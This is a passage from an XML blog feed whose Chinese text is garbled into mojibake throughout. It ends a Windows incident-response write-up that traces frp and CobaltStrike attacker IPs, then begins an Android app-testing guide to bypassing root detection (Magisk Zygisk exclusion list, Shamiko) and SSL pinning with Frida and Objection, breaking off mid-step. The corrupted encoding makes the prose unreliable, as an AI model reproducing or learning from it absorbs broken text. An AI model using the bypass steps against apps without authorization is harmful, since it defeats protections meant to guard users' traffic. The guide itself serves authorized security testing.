data-src="/../images/emergency/windows/11-169833120954717.png" data-caption="11"><img src="/../images/emergency/windows/11-169833120954717.png" alt="11"></a></p><h3 id="4-3-æ”»å‡»-IP-æº¯æº"><a href="#4-3-æ”»å‡»-IP-æº¯æº" class="headerlink" title="4.3 æ”»å‡» IP æº¯æº"></a>4.3 æ”»å‡» IP æº¯æº</h3><p>é€šè¿‡æ•´åˆå‰é¢çš„ä¿¡æ¯ï¼Œå¯¹ frp æœåŠ¡ç«¯ IP ä»¥åŠ CobaltStrike IP è¿›è¡Œç®€å•ä¿¡æ¯è·å–ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/image-20231026224507781.png" data-caption="image-20231026224507781"><img src="/../images/emergency/windows/image-20231026224507781.png" alt="image-20231026224507781"></a></p><p>CobaltStrike æ”»å‡»è€…IP</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/17-169833184589922.png" data-caption="17"><img src="/../images/emergency/windows/17-169833184589922.png" alt="17"></a></p><p>å‡ºå£ IP ä¼ä¸šç›¸å…³ä¿¡æ¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/emergency/windows/18.png" data-caption="18"><img src="/../images/emergency/windows/18.png" alt="18"></a></p><h3 id="4-4-å°ç»“"><a href="#4-4-å°ç»“" class="headerlink" title="4.4 å°ç»“"></a>4.4 å°ç»“</h3><p>ä»¥ä¸Šæ¡ˆä¾‹åªæ˜¯é€šè¿‡å¯¹åº”å…¥ä¾µæ’æŸ¥æ€è·¯å°èŠ‚è¿›è¡Œç›¸åº”çš„æ­¥éª¤å±•ç¤ºï¼Œé€šè¿‡ç»“åˆæ‰€å­¦å®é™…è¿ç”¨åœ¨çœŸå®ç¯å¢ƒä¸­ã€‚</p><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><p>æœ¬ç¯‡å¹…é€šè¿‡äº†è§£ Windows æœåŠ¡å™¨çš„å…¥ä¾µæ‰‹æ³•è¿›è¡Œç®€å•çš„é˜è¿°ï¼Œåœ¨å®é™…çš„åº”æ€¥å“åº”ä¸­ï¼Œåº”æ€¥äººå‘˜åº”è¯¥è¦æœ‰ä¸€ä¸ªæ„è¯†å°±æ˜¯ <strong>â€œå¯¹ä¸€åˆ‡äº‹ç‰©ä¿æŒä¸€å®šçš„åˆç†æ€€ç–‘â€</strong> å› ä¸ºå¯¹äºä¸šåŠ¡æ–¹æ¥è¯´ï¼Œä»–ä»¬ä¸ä¸€å®šçŸ¥é“å“ªä¸€ä¸ªä¿¡æ¯ä¼šå¯¹åº”æ€¥æ’æŸ¥èµ·ç›¸å…³çš„ä½œç”¨ï¼Œæœ‰äº›ä»–ä»¬è®¤ä¸ºä¸é‡è¦çš„ä¿¡æ¯ä¹Ÿè®¸å¯¹äºæ’æŸ¥äººå‘˜æ¥è¯´æ˜¯ä¸€ä¸ªå…³é”®çš„ä¿¡æ¯ï¼Œåˆæˆ–è®¸ä»–ä»¬é—æ¼äº†æŸäº›ä¿¡æ¯ï¼Œé€šè¿‡æˆ‘ä»¬çš„è¯¢é—®ä¼šå°†æŸäº›ä¿¡æ¯å¸¦å‡ºæ¥ï¼Œå¢åŠ æ’æŸ¥æ€è·¯ã€‚</p><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.tencent.com/developer/article/2342371</span><br><span class="line">https://wiki.wgpsec.org/knowledge/hw/windows-emergency-response.html</span><br><span class="line">https://blog.csdn.net/wangyuxiang946/article/details/130076229</span><br><span class="line">https://www.cnblogs.com/starrys/p/17129993.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥å“åº”ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows åº”æ€¥å“åº” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APPæµ‹è¯•ç³»åˆ—-Android APPç»•è¿‡å®‰å…¨æ£€æµ‹æœºåˆ¶</title>
      <link href="/2023/09/23/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-Android%20APP%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/09/23/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-Android%20APP%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>å‰æ®µæ—¶é—´é‡åˆ°ä¸€ä¸ª APP æ— æ³•é€šè¿‡ <a href="https://funsiooo.github.io/2022/11/21/APP%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85-Android%E7%AB%AF/">æ­£å¸¸æ‰‹æ®µ</a> è¿›è¡Œ HTTPS æµé‡çš„æŠ“å–ï¼Œ ä¸”å¸¦æœ‰ Root æ£€æµ‹ï¼ŒRoot è¿‡çš„æ‰‹æœºæ— æ³•æ­£å¸¸æ‰“å¼€ APPï¼Œäºæ˜¯å¯¹è¯¥ APP å¼€å±•äº†ç®€å•çš„å­¦ä¹ åˆ†æã€‚</p><blockquote><p>é—®é¢˜åœºæ™¯ï¼šAndroid APP ã€æŸå‚å•†åŠ å£³ã€ä»£ç†æ£€æµ‹+rootæ£€æµ‹ï¼Œæ— æ³•é€šè¿‡æ­£å¸¸æ‰‹æ®µæŠ“å– HTTPS æµé‡ã€‚</p></blockquote><h2 id="äºŒã€ç»•è¿‡-ROOT-æ£€æµ‹"><a href="#äºŒã€ç»•è¿‡-ROOT-æ£€æµ‹" class="headerlink" title="äºŒã€ç»•è¿‡ ROOT æ£€æµ‹"></a>äºŒã€ç»•è¿‡ ROOT æ£€æµ‹</h2><p>Magisk åœ¨ v24 ç‰ˆæœ¬ä¹‹åå–æ¶ˆäº† Magisk hide å’Œåœ¨çº¿ä»“åº“ï¼Œç°å¯ç›´æ¥é€šè¿‡ Zygiskï¼ˆMagisk v24ä¹‹åçš„ç‰ˆæœ¬è‡ªå¸¦ï¼‰æ¥å®ç°å¯¹æŒ‡å®šçš„ APP è¿›è¡Œ Root éšè—ã€‚æ–°ç‰ˆæœ¬ Magisk ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a> ï¼Œç¬”è€…ä½¿ç”¨ç‰ˆæœ¬ä¸º Magisk 26.1ï¼Œä¸‹è½½å®‰è£…å®Œæˆ Magisk åé‡å¯æ‰‹æœºï¼ˆæ³¨æ„è¿™å±äº Root éƒ¨åˆ†ï¼Œè¯¥æ–‡ç« ä¸ä¼šè¯¦ç»†é˜è¿°ï¼Œè¯·æ ¹æ®è‡ªå·±çš„æ‰‹æœºä¸Šç½‘æœç´¢ç›¸å…³çš„æ–‡ç« è¿›è¡Œå®‰è£…ï¼‰ã€‚</p><p>å…·ä½“ APP ä½¿ç”¨äº† Root æ£€æµ‹å¯¼è‡´ APP æ— æ³•æ­£å¸¸ä½¿ç”¨æƒ…å†µï¼Œå¦‚ï¼šç•Œé¢æç¤º Root æœºå™¨æ— æ³•è¿è¡Œã€ APP è½¯ä»¶é—ªé€€ã€è½¯ä»¶å¡åœ¨æŸä¸€é¡µé¢ï¼Œç­‰ç­‰æƒ…å†µã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/Root.png" data-caption="Root"><img src="/../images/app/bypass/Root.png" alt="Root"></a></p><blockquote><p>æ³¨æ„ï¼šæ‰‹æœºåˆ·å…¥ Magisk å®ç° Root çš„æ‰‹æœºç¯å¢ƒéœ€è¦è‡ªå·±æå‰å‡†å¤‡ï¼Œè¿™è¾¹ä¸ä½œå±•ç¤ºï¼Œå› ä¸ºæ¯å°æœºå­æœ‰äº›è®¸å·®å¼‚ï¼Œç¬”è€…ä½¿ç”¨çš„æ˜¯ Mi 8 åˆ· Pixel experience ç¯å¢ƒï¼Œå…·ä½“æ–‡ç« å¯å‚è€ƒï¼š<a href="https://funsiooo.github.io/2023/04/04/Experience">APPæµ‹è¯•ç³»åˆ—-å°ç±³8 çº¿åˆ· Pixel Experience</a></p></blockquote><h3 id="æ–¹æ³•ä¸€ï¼šä½¿ç”¨é«˜ç‰ˆæœ¬-Magisk-ç»•è¿‡"><a href="#æ–¹æ³•ä¸€ï¼šä½¿ç”¨é«˜ç‰ˆæœ¬-Magisk-ç»•è¿‡" class="headerlink" title="æ–¹æ³•ä¸€ï¼šä½¿ç”¨é«˜ç‰ˆæœ¬ Magisk ç»•è¿‡"></a>æ–¹æ³•ä¸€ï¼šä½¿ç”¨é«˜ç‰ˆæœ¬ Magisk ç»•è¿‡</h3><p>åœ¨ Magisk v24 ä¹‹å Zygisk è‡ªå¸¦ â€œéµå®ˆæ’é™¤åˆ—è¡¨â€ åŠŸèƒ½ï¼Œå¯é€šè¿‡è¯¥åŠŸèƒ½å¯¹æŒ‡å®šçš„ APP è¿›è¡Œ Root éšè— ï¼Œå³æ‰‹æœºå®é™…å·²ç» Root ä½†æ‰‹æœºå¯å•ç‹¬å‘Šè¯‰æŒ‡å®šçš„ APPï¼š â€œæˆ‘æ˜¯ Androidï¼Œæˆ‘æ²¡ Rootï¼Œå¼€é—¨è®©æˆ‘è¿›å»â€ã€‚å…·ä½“æ“ä½œï¼š <code>æ‰“å¼€ Magisk APP -ã€‹ç‚¹å‡»å³ä¸Šè§’è®¾ç½®-ã€‹ç‚¹å‡»å¼€å¯ Zygisk-ã€‹é‡å¯æ‰‹æœº-ã€‹å†æ¬¡æ‰“å¼€ Magisk è¿›å…¥è®¾ç½®æ‰“å¼€éµå®ˆæ’é™¤åˆ—è¡¨-ã€‹ ç‚¹å‡»é…ç½®æ’é™¤åˆ—è¡¨-ã€‹ å‹¾é€‰éœ€è¦éšè— Root çš„ App ç¨‹åº</code> ï¼Œç„¶åå†æ¬¡æ‰“å¼€æµ‹è¯• APP æŸ¥çœ‹æ˜¯å¦å·²ç»ç»•è¿‡äº† Root æ£€æµ‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-1.png" data-caption="ç»•è¿‡Root-1"><img src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-1.png" alt="ç»•è¿‡Root-1"></a></p><h3 id="æ–¹æ³•äºŒï¼šä½¿ç”¨-Shamiko-æ’ä»¶ç»•è¿‡"><a href="#æ–¹æ³•äºŒï¼šä½¿ç”¨-Shamiko-æ’ä»¶ç»•è¿‡" class="headerlink" title="æ–¹æ³•äºŒï¼šä½¿ç”¨ Shamiko æ’ä»¶ç»•è¿‡"></a>æ–¹æ³•äºŒï¼šä½¿ç”¨ Shamiko æ’ä»¶ç»•è¿‡</h3><p>å½“ç„¶é™¤äº†è‡ªå¸¦çš„ Root éšè—ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ Shamiko æ’ä»¶æ¨¡å—è¿›è¡Œ Root éšè—ï¼Œè‹¥ç¬¬ä¸€ç§æ–¹æ³•ä¸è¡Œï¼Œå¯å°è¯•è¿™ä¸€ç§ï¼Œè¿™é‡Œæä¾›å¤šä¸€ä¸ªæ€è·¯ã€‚å…·ä½“æ’ä»¶å®‰è£…æ­¥éª¤ï¼š <code>æ‰“å¼€ Magisk APP -ã€‹ç‚¹å‡»å³ä¸‹è§’æ¨¡å—-ã€‹ç‚¹å‡»ä»æœ¬åœ°å®‰è£…æ‰¾åˆ°æå‰ä¸‹è½½çš„ Shamiko æ’ä»¶å®‰è£…åŒ…-ã€‹ ç‚¹å‡»é‡å¯,é‡å¯æ‰‹æœºåæŸ¥çœ‹æ¨¡å—å‡ºç° Shamiko å³å®‰è£…å®Œæˆ</code> ï¼ŒShamiko æ’ä»¶åœ°å€ï¼š<a href="https://github.com/LSPosed/LSPosed.github.io/releases">https://github.com/LSPosed/LSPosed.github.io/releases</a></p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-2.jpg" data-caption="ç»•è¿‡Root-2"><img src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-2.jpg" alt="ç»•è¿‡Root-2"></a></p><p>å®‰è£…å®Œæ’ä»¶åå°±å¯ä»¥é…ç½®éœ€è¦éšè—çš„ APP åˆ—è¡¨ç»•è¿‡ Root æ£€æµ‹ï¼Œå…·ä½“æ“ä½œï¼š <code>æ‰“å¼€ Magisk APP -ã€‹ç‚¹å‡»å³ä¸Šè§’è®¾ç½®-ã€‹å…³é—­&quot;å¼€å¯çš„éµå®ˆæ’é™¤åˆ—&quot;-ã€‹é‡å¯æ‰‹æœº-ã€‹é‡æ–°æ‰“å¼€ Magisk APP å³ä¸Šè§’è®¾ç½®-ã€‹é…ç½®æ’é™¤åˆ—è¡¨-ã€‹ç‚¹å‡»å‹¾é€‰éœ€è¦ç»•è¿‡çš„ App</code> ï¼Œç„¶åæ‰“å¼€ APP æŸ¥çœ‹æ˜¯å¦ç»•è¿‡äº† Root æ£€æµ‹ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-3.png" data-caption="ç»•è¿‡Root-3"><img src="/../images/app/bypass/%E7%BB%95%E8%BF%87Root-3.png" alt="ç»•è¿‡Root-3"></a></p><h3 id="æ–¹æ³•å·®å¼‚"><a href="#æ–¹æ³•å·®å¼‚" class="headerlink" title="æ–¹æ³•å·®å¼‚"></a>æ–¹æ³•å·®å¼‚</h3><p><strong>Shamiko ä¸ zygisk magiskè‡ªå¸¦çš„éµå®ˆæ’é™¤åˆ—è¡¨çš„åŒºåˆ«ï¼š</strong>è‹¥ä½¿ç”¨ zygisk magisk(å³é«˜ç‰ˆæœ¬ Magisk v24+) è‡ªå¸¦çš„æ’é™¤åˆ—è¡¨åŠŸç»•è¿‡ Root æ£€æµ‹ï¼Œè¿™æ ·æ’é™¤åˆ—è¡¨ä¸­çš„åº”ç”¨åˆ™æ— æ³•ä½¿ç”¨ magisk å’Œ xposed æ¨¡å—ï¼Œå½“æƒ³å¯¹æŸä¸ªæ’é™¤åˆ—è¡¨ä¸­çš„åº”ç”¨ä½¿ç”¨è™šæ‹Ÿæ¡†æ¶å’Œæ¨¡å—ï¼Œå°±éœ€è¦ä½¿ç”¨åˆ° Shamiko æ¨¡å—ï¼Œè¿™è¾¹åªäº†è§£ä¸¤ç§æ–¹æ³•å·®å¼‚ï¼Œä¸ä½œè¯¦ç»†æ¢ç©¶ã€‚</p><h2 id="ä¸‰ã€ç»•è¿‡-SSL-Pinning"><a href="#ä¸‰ã€ç»•è¿‡-SSL-Pinning" class="headerlink" title="ä¸‰ã€ç»•è¿‡ SSL Pinning"></a>ä¸‰ã€ç»•è¿‡ SSL Pinning</h2><h3 id="Android-ç›¸å…³çŸ¥è¯†ç‚¹"><a href="#Android-ç›¸å…³çŸ¥è¯†ç‚¹" class="headerlink" title="Android ç›¸å…³çŸ¥è¯†ç‚¹"></a>Android ç›¸å…³çŸ¥è¯†ç‚¹</h3><blockquote><p>Hook æŠ€æœ¯</p></blockquote><p><strong>Hook</strong> é€šå¸¸è¢«ç§°ä¸º <strong>é’©å­</strong>ï¼ŒæŒ‡ Android åº”ç”¨ç¨‹åºåœ¨è¿è¡Œä¸­é€šè¿‡ä¿®æ”¹æˆ–æ‰©å±•ç°æœ‰ä»£ç çš„è¡Œä¸ºæ¥å®ç°æŸç§ç‰¹å®šåŠŸèƒ½æˆ–å®ç°å®šåˆ¶åŒ–éœ€æ±‚çš„æŠ€æœ¯ã€‚æ¢ä¸ªæ€è·¯ç†è§£å°±ç±»ä¼¼äºæˆ‘ä»¬æ—¥å¸¸ Burp æŠ“åŒ…ä¿®æ”¹ï¼Œå½“ Android åº”ç”¨åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ Hook æŠ€æœ¯ï¼ˆé’©å­ï¼‰æ’å…¥æˆ–ä¿®æ”¹åº”ç”¨ç¨‹åºçš„ä»£ç ä½¿å…¶æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ•ˆæœã€‚</p><p>å…¶ä¸­ä¸»è¦ Hook å®ç°æŠ€æœ¯åˆåˆ†ä¸ºï¼š</p><ul><li><strong>åŠ¨æ€ä»£ç†ï¼š</strong>é€šè¿‡åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡æ¥æ‹¦æˆªç›®æ ‡å¯¹è±¡çš„æ–¹æ³•è°ƒç”¨ï¼Œå¹¶åœ¨è°ƒç”¨å‰åæ‰§è¡Œè‡ªå®šä¹‰ä»£ç ã€‚åœ¨ Android ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ Java çš„åŠ¨æ€ä»£ç†æœºåˆ¶æˆ–è€…ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ Xposedã€Frida æ¡†æ¶ï¼‰æ¥å®ç°åŠ¨æ€ä»£ç†ã€‚</li><li><strong>å­—èŠ‚ç æ³¨å…¥ï¼š</strong>é€šè¿‡ä¿®æ”¹åº”ç”¨ç¨‹åºçš„å­—èŠ‚ç æ¥æ’å…¥è‡ªå®šä¹‰çš„ä»£ç ã€‚è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨å­—èŠ‚ç æ“ä½œåº“ï¼ˆå¦‚ ASMã€DexPatcherï¼‰æˆ–è€… Xposed æ¡†æ¶æ¥å®ç°ã€‚å­—èŠ‚ç æ³¨å…¥å¯ä»¥åœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶ä¿®æ”¹ä»£ç é€»è¾‘ï¼Œç”šè‡³å¯ä»¥æ›¿æ¢æ•´ä¸ªæ–¹æ³•çš„å®ç°ã€‚</li></ul><blockquote><p>Hook æ¡†æ¶</p></blockquote><p><strong>Frida</strong></p><p>åŠ¨æ€æ’æ¡©å·¥å…·åŒ…ï¼ŒFrida å…è®¸å¼€å‘è€…ä½¿ç”¨ JavaScript ç¼–å†™è‡ªå®šä¹‰è„šæœ¬ä¸ç›®æ ‡åº”ç”¨ç¨‹åºè¿›è¡Œäº¤äº’å¹¶ä¿®æ”¹å…¶è¡Œä¸ºï¼ŒFrida è¿˜æä¾› äº† APIï¼Œå¯ä»¥è¿›è¡ŒåŠ¨æ€ä»£ç æ³¨å…¥ã€å‡½æ•°æŒ‚é’©ã€å†…å­˜æ“ä½œã€è„±å£³ç­‰ã€‚</p><p><strong>Xposed</strong></p><p>åŸºäº Root æƒé™çš„æ¡†æ¶ï¼Œç”¨äºåœ¨ Android è®¾å¤‡ä¸Šä¿®æ”¹åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚Xposed çš„æ ¸å¿ƒæ¦‚å¿µæ˜¯ â€œæŒ‚é’©â€ï¼ˆhookingï¼‰å³é€šè¿‡åœ¨åº”ç”¨ç¨‹åºçš„è¿è¡Œæ—¶ç¯å¢ƒä¸­æ’å…¥ä»£ç æ¥æ‹¦æˆªå’Œä¿®æ”¹æ–¹æ³•è°ƒç”¨ï¼Œå¼€å‘è€…å¯ä»¥åœ¨ä¸ä¿®æ”¹åº”ç”¨ç¨‹åºæºä»£ç çš„æƒ…å†µä¸‹ï¼Œå¯¹åº”ç”¨ç¨‹åºçš„è¡Œä¸ºè¿›è¡Œä¿®æ”¹å’Œæ‰©å±•ã€‚Xposed æ¨¡å—é€šå¸¸ä½¿ç”¨ Java æˆ– Kotlin ç¼–å†™ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ Xposed æ¡†æ¶æä¾›çš„ API æ¥ä¸ç›®æ ‡åº”ç”¨ç¨‹åºè¿›è¡Œäº¤äº’ã€‚</p><h3 id="HTTPS-åŠ å¯†æœºåˆ¶"><a href="#HTTPS-åŠ å¯†æœºåˆ¶" class="headerlink" title="HTTPS åŠ å¯†æœºåˆ¶"></a>HTTPS åŠ å¯†æœºåˆ¶</h3><p>é€šå¸¸å¯¹äº Android APP HTTPS æµé‡çš„æŠ“å–ï¼Œç¬”è€…ä¸€èˆ¬æƒ…å†µä¸‹ä¹ æƒ¯ä½¿ç”¨ Friddle + Burp çš„ç»„åˆè¿›è¡Œæµé‡çš„æŠ“å–ï¼Œå…·ä½“æ–‡ç« å¯å‚è€ƒï¼š<a href="https://funsiooo.github.io/2022/11/21/APP%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85-Android%E7%AB%AF/">APPæµ‹è¯•ç³»åˆ—-Androidå®¢æˆ·ç«¯æµé‡æŠ“åŒ…</a>ï¼Œä½†å½“ APP ä½¿ç”¨äº†å…¶å®ƒçš„æœºåˆ¶æˆ–åŠ å¯†æ–¹å¼åˆ™å¯èƒ½å¯¼è‡´æ— æ³•æŠ“å–è¯¥ APP HTTPS çš„æµé‡ï¼Œè¿™æ—¶å€™å°±éœ€è¦åˆ†æä¸€ä¸‹ HTTPS çš„åŠ å¯†æœºåˆ¶äº†ã€‚</p><blockquote><p>SSL&#x2F;TLS åŠ å¯†åè®®</p></blockquote><p>HTTPS åœ¨ HTTP åŸºç¡€ä¸Šæ·»åŠ äº† SSL&#x2F;TLS åŠ å¯†å±‚çš„åè®®ï¼Œå…¶ä¸­ä¸€ç”¨é€”å°±æ˜¯ä¸ºäº†é˜²æ­¢ <strong>MITMä¸­é—´äººæ”»å‡»</strong> ã€‚æ—¥å¸¸æˆ‘ä»¬ä½¿ç”¨ Burp æŠ“åŒ…ä¹ŸçŸ¥é“ï¼Œæƒ³è¦è·å– HTTPS ç½‘ç«™çš„æ˜æ–‡æ•°æ®åŒ…æˆ‘ä»¬éœ€è¦å®‰è£… Burp CA è¯ä¹¦æ‰èƒ½æ‹¦æˆªå’Œè§£å¯†é€šä¿¡æ•°æ®ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬åœ¨æŠ“å– HTTPS æµé‡æ—¶ï¼Œä¾‹å¦‚æŠ“å–å®‰å…¨è®¾å¤‡ç½‘ç«™é¡µé¢é€šå¸¸æ•°æ®åŒ…éƒ½æ˜¯åŠ å¯†çš„ï¼Œè¿™æ˜¯å› ä¸ºç½‘ç«™ä½¿ç”¨äº†è¾ƒæ–°çš„ TLS ç‰ˆæœ¬å’ŒåŠ å¯†å¥—ä»¶æˆ–è€…ä½¿ç”¨äº†ç‰¹å®šçš„å®¢æˆ·ç«¯è¯ä¹¦ï¼Œæ­¤æ—¶ Burp CA è¯ä¹¦çš„è§£å¯†æ–¹å¼å°±å¤±æ•ˆäº†ï¼Œæ‰€ä»¥å°±åªèƒ½æŠ“å–åˆ°ä¸€çªœåŠ å¯†çš„æ•°æ®ã€‚</p><blockquote><p>SSL PINNING</p></blockquote><p>SSL pinningï¼ˆSSLè¯ä¹¦é”å®šï¼‰æ˜¯ä¸€ç§ç”¨äºå¢å¼ºåº”ç”¨ç¨‹åºå®‰å…¨æ€§çš„æŠ€æœ¯ï¼Œä¸»è¦ç”¨åœ¨é˜²æ­¢ä¸­é—´äººæ”»å‡»å’Œè¯ä¹¦æ¬ºéª—ã€‚ä¸»è¦éªŒè¯æœºåˆ¶å¦‚ä¸‹ï¼š</p><ul><li><strong>åº”ç”¨ç¨‹åºå†…ç½®å…¬é’¥ï¼š</strong>åº”ç”¨ç¨‹åºå¼€å‘è€…å°†æœåŠ¡å™¨çš„å…¬é’¥æˆ–è¯ä¹¦æŒ‡çº¹åµŒå…¥åˆ°åº”ç”¨ç¨‹åºä»£ç ä¸­ï¼Œé€šå¸¸æ˜¯åœ¨åº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶æˆ–ä»£ç çš„ç‰¹å®šä½ç½®ã€‚</li><li><strong>è¿è¡Œæ—¶éªŒè¯ï¼š</strong>å½“åº”ç”¨ç¨‹åºå»ºç«‹ä¸æœåŠ¡å™¨çš„è¿æ¥æ—¶ï¼Œå®ƒä¼šéªŒè¯æœåŠ¡å™¨çš„å…¬é’¥æˆ–è¯ä¹¦æŒ‡çº¹æ˜¯å¦ä¸é¢„ç½®çš„å€¼åŒ¹é…ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œåˆ™å»ºç«‹å®‰å…¨è¿æ¥ï¼›å¦‚æœä¸åŒ¹é…ï¼Œåˆ™è®¤ä¸ºè¿æ¥ä¸å®‰å…¨ï¼Œå¯èƒ½å­˜åœ¨ä¸­é—´äººæ”»å‡»ã€‚</li></ul><p>é€šè¿‡ SSL Pinningï¼Œåº”ç”¨ç¨‹åºå¯ä»¥ç¡®ä¿ä¸æœåŠ¡å™¨å»ºç«‹å®‰å…¨è¿æ¥çš„è¿‡ç¨‹ä¸­ä¸è¢«ä¸­é—´äººæ”»å‡»æ‰€ç ´åã€‚å³ä½¿æ”»å‡»è€…ä½¿ç”¨ä¼ªé€ çš„è¯ä¹¦ï¼Œç”±äºä¸é¢„ç½®çš„å…¬é’¥æˆ–è¯ä¹¦æŒ‡çº¹ä¸åŒ¹é…ï¼ŒéªŒè¯è¿‡ç¨‹å°†å¤±è´¥ï¼Œæ™®é€šçš„ Burp CA ä¹Ÿå°±è‡ªç„¶æ— æ³•æŠ“å–è¯¥ç¨‹åºçš„ HTTPS æµé‡ã€‚</p><p><strong>å¦‚ä½•åˆ¤æ–­åº”ç”¨ç¨‹åºä½¿ç”¨äº† SSL pinning ï¼Ÿ</strong></p><p>åœ¨æ—¥å¸¸æµ‹è¯•ä¸­ï¼Œç»è¿‡å¤šæ¬¡çš„å‰è½¦ä¹‹é‰´ï¼Œå½“å¸¸è§„æ–¹æ³•ä¸èƒ½æŠ“å– HTTPS æµé‡æ—¶ï¼Œè‡ªç„¶è€Œç„¶å°±æƒ³åˆ°ç¨‹åºæ˜¯å¦ä½¿ç”¨äº† SSL Pinning ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¹ç¨‹åºçš„åˆ†ææ¥è¿›è¡Œåˆ¤æ–­ã€‚ä¾‹å¦‚å°†è¯¥ç¨‹åº apk è¿›è¡Œé€†å‘åˆ†æï¼Œå…¨å±€æœç´¢å…¶ä»£ç æœ‰æ²¡æœ‰ä½¿ç”¨å¦‚ï¼š<strong>HttpURLConnectionã€HttpClientã€OkHttpã€Volley</strong> ç­‰åº“ï¼Œå¹¶åˆ†æå…¶é€»è¾‘ï¼Œæ˜¾ç„¶è¿™ç§æ–¹å¼å¯¹äºæµ‹è¯•è€…æ¥è¯´è¿‡äºå¤æ‚ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è·³è¿‡åˆ†æå°è¯•ç»•è¿‡ SSL Pinning è‹¥èƒ½æŠ“åˆ°å³ä¸ºä½¿ç”¨äº† SSL Pinning é™ä½æµ‹è¯•æˆæœ¬ ã€‚</p><h3 id="Frida-Objection-ç»•è¿‡-SSL-Pinning"><a href="#Frida-Objection-ç»•è¿‡-SSL-Pinning" class="headerlink" title="Frida + Objection ç»•è¿‡ SSL Pinning"></a>Frida + Objection ç»•è¿‡ SSL Pinning</h3><p>Frida æˆ‘ä»¬åœ¨å‰é¢å·²ç»ç®€å•çš„ä»‹ç»è¿‡äº†ï¼Œè¿™è¾¹å†å¼•å…¥ä¸€ä¸ªå¼€æºå·¥å…·ï¼šObjection ï¼Œ Objection æ˜¯åŸºäº Frida æ¡†æ¶å¼€å‘çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒæä¾›äº†ä¸€ç»„ä¾¿æ·çš„åŠŸèƒ½å’Œè„šæœ¬ï¼Œä»¥ç®€åŒ–åœ¨ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ Frida è¿›è¡ŒåŠ¨æ€åˆ†æå’Œæ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹ã€‚å…¶ä¸­ Objection å†…ç½®äº† SSL Pinning ç»•è¿‡è„šæœ¬ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ Frida + Objection å»ç»•è¿‡ Android åº”ç”¨çš„ SSL Pinningï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1ã€ä¸‹è½½ adb ç”¨äºç”µè„‘ä¸æ‰‹æœºçš„è¿æ¥ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn">https://developer.android.google.cn/studio/releases/platform-tools?hl=zh-cn</a></p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-1.png" data-caption="adb-1"><img src="/../images/app/bypass/adb-1.png" alt="adb-1"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-2.png" data-caption="adb-2"><img src="/../images/app/bypass/adb-2.png" alt="adb-2"></a></p><p>2ã€ä½¿ç”¨å…·å¤‡æ•°æ®ä¼ è¾“çš„ usb 